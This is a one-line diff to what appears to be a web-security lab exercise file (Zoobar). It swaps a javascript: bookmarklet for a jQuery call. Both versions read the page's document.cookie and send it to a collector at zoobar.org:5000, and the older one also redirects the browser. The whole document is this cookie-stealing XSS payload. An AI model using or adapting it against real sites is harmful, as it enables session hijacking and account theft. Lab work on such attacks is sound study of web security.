@@ -1,1 +1,1 @@
-javascript:{var xhp = new XMLHttpRequest();xhp.open('GET', 'http://zoobar.org:5000/cookie?cookie=' + encodeURIComponent(document.cookie), false);xhp.send();window.location='http://zoobar.org:5000/';}
+$.get('http://zoobar.org:5000/cookie?cookie='+encodeURIComponent(document.cookie));
